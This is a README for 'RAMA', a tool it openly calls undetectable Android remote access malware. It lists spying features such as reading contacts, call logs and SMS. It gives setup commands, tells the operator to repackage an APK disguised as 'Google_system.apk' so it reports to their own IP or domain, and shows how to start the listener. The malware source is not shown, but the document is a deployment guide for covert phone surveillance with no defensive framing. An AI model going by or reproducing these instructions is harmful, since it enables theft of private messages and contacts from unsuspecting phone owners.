# RAMA

## Remote Access Malware for Android
## Malware is Undetectable

### feachers
  * Foreground service
  * Device info
  * Access Contacts
  * Access Call Logs
  * Access sms
  * Access Packages
  * Access Torch
# Tested malware on :
  * Vivo T1 5G (Android 13)
  * Vivo V15 (Android 11)
  * Redmi Note9 (Android 12)
  * Realmi Narzo 50i (Android 11)
### Commands: 

### first clone RAMA directory
```bash
git clone https://github.com/HuiHola/RAMA.git
```

### change dir to RAMA
```bash
cd RAMA
```

### run setup file to install all package that required
```bash
./setup
```
## NOTE:- 
please manually decompile Google_system.apk provide in RAMA tool dirctory and put your ip/domain to assts/ip.txt

### ![IMG_20230731_174450](https://github.com/HuiHola/RAMA/assets/84129766/d3d77fbf-43d7-47ad-bf57-67f4592ae25f)

### After done that you can run Rama.py with -l argument and give port where http server running.

```bash
python3 Rama.py -l <port>
```


## one line command
```bash
git clone https://github.com/HuiHola/RAMA.git
cd RAMA
./setup
```
## If throw any error package related than use this command.

```bash
apt install python3 -y && apt install nodejs -y && apt install pv -y && npm install express && npm install loading-spinner && npm install npm install prompt-sync && pip install lolcat && apt install figlet -y
```



